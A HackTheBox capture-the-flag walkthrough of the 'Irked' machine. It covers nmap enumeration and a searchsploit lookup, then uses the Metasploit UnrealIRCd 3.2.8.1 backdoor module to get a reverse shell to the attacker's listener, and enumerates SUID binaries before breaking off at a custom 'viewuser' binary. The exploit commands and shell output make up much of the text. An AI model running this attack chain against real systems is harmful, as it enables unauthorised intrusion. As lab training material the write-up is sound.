---
layout: single
classes: wide
title:  "Walkthrough - Irked"
date: 2019-03-24
categories:
    - "hackthebox"
    - walkthrough
tags:
    - machines
    - easy
    - linux
---

![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/irked/banner.JPG)

Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)

First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).

```bash
kali@noone:~/Irked$ nmap -v -p- -sC -sV -oA nmap 10.10.10.117
# Nmap 7.70 scan initiated Sun Feb 10 20:26:11 2019 as: nmap -v -p- -sC -sV -oA nmap 10.10.10.117
Nmap scan report for 10.10.10.117
Host is up (0.25s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesnt have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          53857/udp  status
|_  100024  1          59504/tcp  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
59504/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 10 20:44:03 2019 -- 1 IP address (1 host up) scanned in 1072.35 seconds
```

We have a few ports open. A few weird ports with IRC service running on them. But lets start with the most common way, port 80.

![port80]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/irked/port-80.JPG)

Just a smiley. I am going to pivot and do something else. A `searchsploit` on `UnrealIRCd` got me this.

```bash
kali@noone:~/Irked$ searchsploit UnrealIRCd
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                               |  Path
                                                                                                                                                                                             | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                                                                 | exploits/linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                                                                                      | exploits/windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                                                                                               | exploits/linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                                                                                                                    | exploits/windows/dos/27407.pl
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

There's a metasploit module. Let's try it out.

```bash
root@noone:/home/pswapnil/Retired/Irked# msfconsole
msf5 > search unreal                                                                                                                                                                                                         

Matching Modules                                                                                                                                                                                                             
================                                                                                                                                                                                                            

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   1  exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Linux)
   2  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution                                                                                                    
   3  exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Win32)                                                               


msf5 > use exploit/unix/irc/unreal_ircd_3281_backdoor                                                                                                                                                                        
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options                                                                                                                                                              

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):                                                                                                                                                                

   Name    Current Setting  Required  Description                                             
   ----    ---------------  --------  -----------                
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   6667             yes       The target port (TCP)


Exploit target:                                          

   Id  Name                                                                     
   --  ----                                                                     
   0   Automatic Target                                                         


msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.10.10.117      
RHOSTS => 10.10.10.117
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6697
RPORT => 6697                                                                    
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP double handler on 10.10.16.102:4444
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...                    
[*] 10.10.10.117:6697 - Sending backdoor command...                             
[*] Accepted the first client connection...                                     
[*] Accepted the second client connection...                                    
[*] Command: echo NYsVwSUaezV0FKxG;                                             
[*] Writing to socket A                                                         
[*] Writing to socket B                                                         
[*] Reading from sockets...                                                     
[*] Reading from socket A                                                       
[*] A: "NYsVwSUaezV0FKxG\r\n"                                                   
[*] Matching...                                                                 
[*] B is input...                                                                                
[*] Command shell session 1 opened (10.10.16.102:4444 -> 10.10.10.117:32986) at 2019-04-29 12:07:43 -0400

id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
pwd
/home/ircd/Unreal3.2
```

I will upgrade to a full TTY. To know how I did that, follow [this](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

```bash
ircd@irked:~$ cd /home
ircd@irked:/home$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 May 14  2018 .
drwxr-xr-x 21 root     root     4096 May 15  2018 ..
drwxr-xr-x 18 djmardov djmardov 4096 Apr 30 08:28 djmardov
drwxr-xr-x  3 ircd     root     4096 May 15  2018 ircd
ircd@irked:/home$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
ircd@irked:/home$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-04-03 06:34 (:0)
djmardov pts/2        2019-04-04 09:01 (10.10.14.14)
sh: 1: /tmp/listusers: not found
```
